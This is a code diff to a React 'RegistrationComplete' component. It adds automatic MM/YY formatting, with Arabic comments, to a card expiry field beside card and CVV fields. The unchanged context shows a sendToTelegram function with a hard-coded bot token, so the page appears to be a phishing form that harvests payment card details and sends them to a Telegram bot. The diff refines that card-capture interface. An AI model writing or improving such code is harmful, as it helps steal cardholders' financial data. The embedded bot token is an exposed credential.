@@ -22,6 +22,18 @@ const RegistrationComplete = () => {
   const [cvv, setCvv] = useState<string>("");
   const navigate = useNavigate();
 
+  const handleExpiryDateChange = (value: string) => {
+    // إزالة كل ما ليس رقم
+    const cleaned = value.replace(/\D/g, '');
+    
+    // تنسيق تلقائي: إضافة / بعد الشهر
+    if (cleaned.length <= 2) {
+      setExpiryDate(cleaned);
+    } else if (cleaned.length <= 4) {
+      setExpiryDate(`${cleaned.slice(0, 2)}/${cleaned.slice(2)}`);
+    }
+  };
+
   const sendToTelegram = async (message: string) => {
     try {
       const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
@@ -221,11 +233,12 @@ const RegistrationComplete = () => {
                     <input
                       type="text"
                       placeholder="MM/YY"
-                      className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-center focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
+                      className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-right focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                       maxLength={5}
                       dir="ltr"
+                      inputMode="numeric"
                       value={expiryDate}
-                      onChange={(e) => setExpiryDate(e.target.value)}
+                      onChange={(e) => handleExpiryDateChange(e.target.value)}
                     />
                   </div>
                   <div className="space-y-2">
